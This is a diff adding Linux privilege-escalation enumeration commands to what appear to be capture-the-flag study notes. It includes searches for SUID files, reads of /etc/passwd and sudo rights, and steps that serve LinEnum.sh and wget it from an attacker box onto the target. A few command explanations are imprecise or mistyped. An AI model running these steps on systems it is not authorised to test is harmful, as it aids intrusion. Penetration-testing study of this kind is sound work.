@@ -1,6 +1,56 @@
 # Enumeration
 
 - use the LinEnum.sh script it gives good info.
+- Some of the other important enumeration items
+```
+hostname
+uname -a
+cat /proc/version -> provides information about target system processes
+cat /etc/issue
+ps
+ps -A -> all running processes
+ps axjf -> view process tree
+ps aux -> user processes that are not attached to the terminal
+env
+sudo -l
+ls
+id
+/etc/passwd
+history
+ifconfig
+ip route
+netstat -> gather information on existing network connections
+netstat -a -> shows all the listening ports and established connections
+netstat -at or netstat -au -> list TCP & UDP protocols respectively
+netstat -l -> ports in listening mode. these ports are open & ready to accept incoming connections
+netstat -s -> usage statistics by protocol
+netstat -su -> usage stats for udp
+netstat -st -> usage stats for tcp
+netstat -tp -> connections with pid & service information
+netstat -i -> shows interface statistics
+netstat -ano -> a (display all sockets); n (do not resolve names); o (display timers)
+find . -name flag1.txt
+find /home -name flag1.txt
+find / -type d -name config
+find / -type f -perm 0777
+find / -perm a=x -> find all executable files
+find /home -user frank
+find / -mtime 10 -> files modified in last 10 days
+find / -atime 10 -> files accessed in last 10 days
+find / -cmin 60 -> files changed in the last 60 mins
+find / -amin 60 -> files accessed in the last 60 mins
+find / -size 50M -> files with a size of 50 MB
+find / -size +100M -> files greater than size of 100Mb
+find / -type d -writable 2>/dev/null -> writable directories
+find / -type d -perm -222 2>/dev/null -> "         "
+find / -perm -o w -type d 2>/dev/null -> "         "
+find / -prem -o x -type f -> executable files
+find / -name python*
+find / -name gcc*
+find / -name perl*
+find / -perm -u=s -type f 2>/dev/null -> SUID bit files
+
+```
 - start a webserver with python where the file is present, `python -m http.server 80`
 - go to the target box and use wget there, `wget <attacker-box>:80/LinEnum.sh`
 - `cat /etc/shells` to list the number of available & valid shells on the box
